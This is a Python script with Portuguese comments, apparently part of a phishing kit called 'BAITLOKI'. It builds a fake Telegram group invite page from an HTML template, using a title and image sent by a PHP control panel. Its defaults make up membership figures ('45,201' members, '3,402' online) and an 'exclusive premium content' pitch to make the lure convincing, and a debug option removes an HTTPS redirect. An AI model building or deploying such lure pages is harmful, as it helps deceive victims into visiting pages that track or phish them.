#!/usr/bin/env python3

import os
import shutil
import sys
import re # Necessário para a função print no utils

# --- CORREÇÃO CRÍTICA DE IMPORTAÇÃO ---
# Adiciona o diretório raiz do projeto (um nível acima) ao caminho de busca do Python
# Isso garante que 'import utils' funcione mesmo que o script esteja dentro da pasta 'template/'
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
# -------------------------------------

import utils # Agora esta importação deve funcionar!


R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

# --- MODIFICAÇÃO PARA O BAITLOKI (TELEGRAM) ---
# Busca as variáveis enviadas pelo PHP (GROUP_TITLE, GROUP_IMAGE)
# Para as novas variáveis (DESC, MEM_NUM, ONLINE_NUM), usamos valores padrão
# se não forem enviadas, para evitar que o script trave pedindo input.

title = os.getenv('GROUP_TITLE')
image = os.getenv('GROUP_IMAGE')
desc = os.getenv('DESC')
mem_num = os.getenv('MEM_NUM')
online_num = os.getenv('ONLINE_NUM')

# --- LOGICA DE FALLBACK (Se vier vazio, usa padrão ou pede input) ---

if title is None:
    title = input(f'{G}[+] {C}Group Title : {W}')
else:
    utils.print(f'{G}[+] {C}Group Title (Auto) :{W} '+title)

if image is None:
    image = input(f'{G}[+] {C}Image Path (Best Size : 300x300): {W}')
else:
    utils.print(f'{G}[+] {C}Image (Auto) :{W} '+image)

# Para descrição e números, se não vier do PHP, usamos valores padrão automáticos
# para não quebrar o fluxo do painel web.
if desc is None:
    desc = "Join this exclusive channel to get access to premium content."
    utils.print(f'{G}[+] {C}Group Description (Default) :{W} '+desc)
else:
    utils.print(f'{G}[+] {C}Group Description :{W} '+desc)

if mem_num is None:
    mem_num = "45,201"
    utils.print(f'{G}[+] {C}Number of Members (Default) :{W} '+mem_num)
else:
    utils.print(f'{G}[+] {C}Number of Members :{W} '+mem_num)

if online_num is None:
    online_num = "3,402"
    utils.print(f'{G}[+] {C}Number of Members Online (Default) :{W} '+online_num)
else:
    utils.print(f'{G}[+] {C}Number of Members Online :{W} '+online_num)

# --- PROCESSAMENTO DA IMAGEM ---
img_path = 'template/telegram/images/'
img_name = utils.downloadImageFromUrl(image, img_path)

if img_name :
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    if os.path.exists(image):
        try:
            shutil.copyfile(image, '{}'.format(img_path + img_name))
        except Exception as e:
            utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
    else:
        # Se falhar o download e não for local, segue o baile (pode ficar sem img)
        pass

# --- GERAÇÃO DO HTML ---
try:
    with open('template/telegram/index_temp.html', 'r') as index_temp:
        code = index_temp.read()
        
        if os.getenv("DEBUG_HTTP"):
            code = code.replace('window.location = "https:" + restOfUrl;', '')
            
        code = code.replace('$TITLE$', title)
        code = code.replace('$DESC$', desc)
        code = code.replace('$MEMBERS$', mem_num)
        code = code.replace('$ONLINE$', online_num)
        code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

    with open('template/telegram/index.html', 'w') as new_index:
        new_index.write(code)
        
except FileNotFoundError:
    utils.print(f'{R}[-] {C}Erro: Arquivo index_temp.html não encontrado em template/telegram/{W}')